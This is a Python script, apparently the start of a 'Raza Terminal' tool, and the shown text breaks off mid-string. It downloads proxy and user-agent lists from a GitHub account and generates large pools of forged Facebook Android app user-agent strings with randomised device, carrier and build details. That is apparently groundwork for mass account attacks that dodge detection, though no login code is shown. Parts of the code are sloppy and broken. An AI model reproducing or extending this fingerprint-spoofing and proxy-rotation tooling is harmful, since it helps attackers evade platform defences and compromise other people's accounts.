import timetext = "WELCOME RAZA TERMINAL"for char in text:    print(char, end='', flush=True)    time.sleep(0.3)print("\n")time.sleep(3)for i in range(0, 0):    print(i, end='', flush=True)    time.sleep(0.5)import os, platform, time, systry: import requestsexcept:os.system("pip uninstall requests -y;pip install requests")print('\033[1;91m[\033[1;97m-\033[1;91m] \033[1;92mChecking For Update. . . .')os.system('espeak -a 300 " Wellcome Raza Terminal,"')os.system('')import os,sys,glob,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re,hashlibimport datetime,subprocessimport zipfileimport marshalfrom uuid import uuid4from time import sleep as sp#######---------____________#############def R_UA():    samsung_models = [        "SM-G920F|G920FXXU6EVH6",        "SM-R870|R870XXU1AUH3",        "SM-J320F|J320FXXU0ARL2",        "SM-A125F|A125FXXU1BUA4",        "GT-N7100|N7100XXSFQE1",        "SM-T561|T561XXU0ARB1",        "SM-A715F|A715FXXS5BUI1",        "SM-J320F|I9500XXUEMJ3",        "SM-M325F|M325FXXU1BUH1",        "SM-J320F|J320FXXU0ARL2",        "SM-F916U|F916USQS2JWE4",    ]    model_, build = random.choice(samsung_models).rsplit('|')    os_v = random.randint(4, 13)    fbav = f"{os_v}.0.{random.randint(111, 999)}.{random.randint(111, 999)}"    ua = ('[FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBLC/bn_BD;FBBV/'+str(random.randint(111111111,999999999))+'Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D')    return ua#####_____________user agent____########ugen = []for agent in range(2000):    aa = 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36;'    b = random.choice(['6', '7', '8', '9', '10', '11', '12', '13'])    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])    e = random.randrange(1, 999)    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'    h = random.randrange(73, 100)    i = '0'    j = random.randrange(4200, 4900)    k = random.randrange(40, 150)    l = 'Mobile Safari/533.1'    fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'    ugen.append(fullagnt)#####___________UA2__________########def M4():    abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]    pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])    build = random.choice(abc)+random.choice(abc)+random.choice(abc)    FBBV = str(random.randint(111111111,999999999))    FBCR = random.choice(["Jazz","Zong","Mobilink","Ufone"])    #ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])>    ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/1.6.0 (Linux; U; Android 4.4.4; Z987 Build/KTU84P) [FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; MI 5X MIUI/V10.3.1.0.ODBCNXM) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507224;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBDV/MI 5X;FBSV/8.1.0;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C) [FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build/NJH47F) [FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.0.0; AGS2-L09 Build/HUAWEIAGS2-L09) [FBAN/Orca-Android;FBAV/238.0.0.14.120;FBPN/com.facebook.orca;FBLC/hu_HU;FBBV/179092826;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/AGS2-L09;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1200,height=1852};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML414DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/231.0.0.25.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/170889107;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML414DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1196};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 7.0; Hisense Hi  3 Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/ 180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/ Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi- v7a:armeabi;FBDM/ {density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;]","Dalvik/2.1.0;(Linux;U;Android 7.0;Hisense-Hi-3;Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/Hisense;FBDV/Hisense-Hi-3;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;FBRV/181817659;]","Dalvik/2.1.0 (Linux; U; Android 9; LM-V405 Build/PKQ1.190202.001) [FBAN/FB4A;FBAV/252.0.0.22.355;FBPN/com.facebook.katana;FBLC/en_US;FBBV/191850142;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBDV/LM-V405;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2147};FB_FW/1;FBRV/0;]","Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; POT-LX1 Build/HUAWEIPOT-L01) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/197803941;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1426};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 10; SM-N975U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/253.0.0.17.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/200372525;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBDV/SM-N975U;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2759};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build/HUAWEIDRA-LX2) [FBAN/Orca-Android;FBAV/239.1.0.17.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/180535023;FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1356};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 7.1.1; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/151.0.0.17.95;FBPN/com.facebook.orca;FBLC/en_ZA;FBBV/89897644;FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 10; SM-G970U1 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/es_MX;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]","Dalvik/2.1.0 (Linux; U; Android 10; POT-LX3 Build/HUAWEIPOT-L03) [FBAN/Orca-Android;FBAV/270.0.0.17.120;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/225129965;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2139};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 7.1.2; KFMUWI Build/NS6315) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782190;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=600,height=976};FB_FW/1;]",])    return ua######___________user agent_________######import randomimport requestsdef get_random_user_agent():    # Replace with the raw URL of your GitHub file    url = "https://raw.githubusercontent.com/RazaRathour1/new_ua/refs/heads/main/new_ua.txt"    response = requests.get(url)    response.raise_for_status()  # Ensure the request was successful    user_agents = response.text.splitlines()  # Split lines into a list    return random.choice(user_agents)# Usagerandom_user_agent = get_random_user_agent()print(random_user_agent)######___________user agent_________######def sex():	density = random.choice(['1.0', '1.5', '2.0', '2.25', '2.75', '2.5', '3.0', '3.5', '4.0'])	width = random.choice(["720", "1080"])	height = random.choice(["1280", "1440", "1920"])	END = f'[FBAN/FB4A;FBAV/'+str(random.randint(30,450))+'.0.0.'+str(random.randint(5,70))+'.'+str(random.randint(90,200))+';FBBV/'+str(random.randint(111111111,999999999))+';'+f'[FBAN/FB4A;FBAV/389.0.0.42.111;FBBV/317817216;FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/318410128;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG SHV-E330K;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]'	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(mamu)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END	return uamamu = requests.get('https://raw.githubusercontent.com/RazaRathour1/new_ua/refs/heads/main/new_ua.txt').text.splitlines()try:	proxylist= requests.get('https://raw.githubusercontent.com/RazaRathour1/proxy/refs/heads/main/proxy.txt').text	open('proxy.txt','w').write(proxylist)except Exception as e:passproxy=open('proxy.txt','r').read().splitlines()def __UBI___():    application_version = str(random.randint(111,450))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(80,200))    application_version_code=str(random.randint(000000000,999999999))    android_version=str(random.randrange(6,13))    numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'    build = random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])    fbs = random.choice(["com.facebook.katana"])    ua1 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.1; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBRV/'+str(random.randint(000000000,999999999))+';'+f'FBPN/{str(fbs)};FBLC/en_US;FBCR/null;FBMF/Oppo;FBBD/Oppo;FBDV/{random.choice(mamu)};FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]'    ua2 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.1; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=5.25,width=1440,height=2560};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/banglalink;FBMF/asus;FBBD/asus;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/7.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'    ua3 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.1; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.75,width=720,height=1528};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Vodafone;FBMF/motorola;FBBD/motorola;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]'    ua4 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.1; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.25,width=1080,height=2279};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/lifecell;FBMF/motorola;FBBD/motorola;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]'    ua5 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.1; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1920};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/TelkomSA;FBMF/samsung;FBBD/samsung;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/7.0.1;FBOP/19;FBCA/arm64-v8a:;]'    ua6 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.1; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/grameenphone;FBMF/Xiaomi;FBBD/Redmi;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/6.0.1;FBOP/1;FBCA/arm64-v8a:;]'    ua7 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.2; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.5,width=720,height=1560};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Vodafone UA;FBMF/HUAWEI;FBBD/HUAWEI;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/9.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'    ua8 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.1; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=4.0,width=1080,height=2340};'+f'FBLC/it_IT;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/9.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'    ua9 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.2; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=4.0,width=1080,height=2412};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Nepal Telecom;FBMF/Realme;FBBD/Realme;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'    ua10 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.2; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=4.0,width=1080,height=2412};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Nepal Telecom;FBMF/Realme;FBBD/Realme;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'+'FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]'    ua11 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.2; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=4.0,width=1080,height=2412};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Nepal Telecom;FBMF/Realme;FBBD/Realme;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'+'[FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]'    ua12 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.2; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=4.0,width=1080,height=2412};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Nepal Telecom;FBMF/Realme;FBBD/Realme;'+f'FBPN/{str(fbs)};FBDV/{random.choice(mamu)};FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'+'Dalvik/2.1.0 (Linux; U; Android 11; ONEPLUS A6010 Build/RKQ1.201217.002)'    ua13 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.2; {random.choice(mamu)} Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';'+f'[FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=4.0,width=1080,height=2412};'+f'FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Nepal 